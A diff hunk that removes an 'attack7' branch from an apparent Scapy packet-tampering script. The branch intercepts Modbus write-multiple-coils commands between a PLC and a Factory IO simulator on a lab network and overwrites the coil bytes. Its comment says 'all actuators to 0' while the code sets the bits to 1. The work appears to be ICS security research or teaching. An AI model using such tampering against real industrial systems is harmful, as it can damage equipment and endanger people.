@@ -338,23 +338,6 @@ def modify(packet):
                         packet.set_payload(bytes(scapy_packet))
                     except Exception as e:
                         print(e)
-    elif attack == "attack7":
-        # packet from PLC to factoryIO
-        if scapy_packet[IP].src == "192.168.56.2" and scapy_packet[IP].dst == "192.168.56.1":
-            # sanity check for nonzero TCP packet
-            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
-                # write multiple coils function code
-                if scapy_packet[TCP].payload.load[7] == 0x0F:
-                    try:
-                        payload = list(scapy_packet[TCP].payload.load)
-                        # write all actuators to 0
-                        payload[13] |= 0xFF
-                        payload[14] |= 0xFF
-                        scapy_packet[TCP].payload.load = bytes(payload)
-                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
-                        packet.set_payload(bytes(scapy_packet))
-                    except Exception as e:
-                        print(e)
     packet.accept()
 
 if __name__ == "__main__":
